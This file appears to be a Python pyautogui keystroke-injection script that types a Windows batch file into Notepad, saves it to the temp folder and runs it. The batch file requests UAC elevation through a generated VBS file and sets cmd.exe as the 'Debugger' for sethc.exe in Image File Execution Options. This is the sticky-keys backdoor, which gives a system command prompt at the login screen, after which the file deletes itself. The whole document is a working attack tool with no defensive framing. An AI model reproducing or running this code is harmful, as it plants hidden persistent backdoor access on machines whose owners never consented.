import pyautogui
import time
time.sleep(3)
pyautogui.hotkey("ctrl","esc")
pyautogui.PAUSE = 0.5

pyautogui.write("notepad", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("@echo off", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write(":init", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("setlocal DisableDelayedExpansion", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("set cmdInvoke=1", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.press("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("set winSysFolder=System32", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('set "batchPath=%~0"', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("for %%k in (%0) do set batchName=%%~nk", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("set 'TEMPVBS=%temp%\OEgetPriv_run.vbs'", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("setlocal EnableDelayedExpansion", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write(":checkPrivileges", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("NET FILE 1>NUL 2>NUL", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("if '%errorlevel%' == '0' (goto gotPrivileges) else (goto getPrivileges)", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write(":getPrivileges", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMPVBS%"', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('echo args = "ELEV " >> "%TEMPVBS%"', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('echo For Each strArg in WScript.Arguments >> "%TEMPVBS%"', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('echo args = args ^& strArg ^& " " >> "%TEMPVBS%"', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('echo Next>> "%TEMPVBS%"', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("if '%cmdInvoke%'=='1' goto InvokeCmd", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('echo UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%TEMPVBS%"', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("goto ExecElevation", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write(":InvokeCmd", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('echo args = "/c """ + "!batchPath!" + """ " + args >> "%TEMPVBS%"', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('echo UAC.ShellExecute "%SystemRoot%\%winSysFolder%\cmd.exe", args, "", "runas", 1 >> "%TEMPVBS%"', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write(":ExecElevation", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('"%SystemRoot%\%winSysFolder%\WScript.exe" "%TEMPVBS%" %*', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("exit /B", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write(":gotPrivileges", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('setlocal & cd /d "%~dp0."', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('if "%1'=='ELEV' (del "%TEMPVBS%" 1>nul 2>nul  &  shift /1))
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /ve /f && reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f && cls && echo Payload Installed Successfully && pause && goto end', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("cls", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("echo Payload Install Failed", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write("pause", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write(":end", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.write('del /F /Q "%~0" && exit', interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("ctrl","S")
pyautogui.PAUSE = 0.5

pyautogui.write("%temp%\run.bat", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("tab")
pyautogui.PAUSE = 0.5

pyautogui.write("a", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5

pyautogui.hotkey("alt","f4")
pyautogui.PAUSE = 0.5

pyautogui.hotkey("ctrl","esc")
pyautogui.PAUSE = 0.5

pyautogui.write("%temp%\run.bat", interval=0.02)
pyautogui.PAUSE = 0.5

pyautogui.hotkey("enter")
pyautogui.PAUSE = 0.5
